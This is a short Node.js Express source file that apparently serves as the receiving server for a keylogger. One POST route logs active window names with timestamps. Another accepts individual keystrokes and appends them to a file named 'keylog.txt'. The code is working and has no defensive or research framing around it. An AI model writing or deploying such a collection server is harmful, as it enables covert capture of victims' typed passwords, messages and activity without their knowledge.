const express = require("express");
const bodyParser = require("body-parser");
const fs = require("fs");

const app = express();
const port = 8080;

// Set up body-parser middleware
app.use(bodyParser.json());

// Define the route for receiving window data
app.post("/", (req, res) => {
  const windowName = req.body.window;
  const timestamp = req.body.timestamp;
  console.log("Received window data:", windowName, timestamp);
  // Here you can store the window data in a database or file
  res.sendStatus(200);
});
//change


// Define the route for receiving key data
app.post("/keys", (req, res) => {
  const char = req.body.char;
  const timestamp = req.body.timestamp;
  console.log("Received key data:", char, timestamp);
  // Here you can store the key data in a database or file
  fs.appendFileSync("keylog.txt", char);
  res.sendStatus(200);
});

// Start the server
app.listen(port, () => {
  console.log(`Server listening on port ${port}`);
});
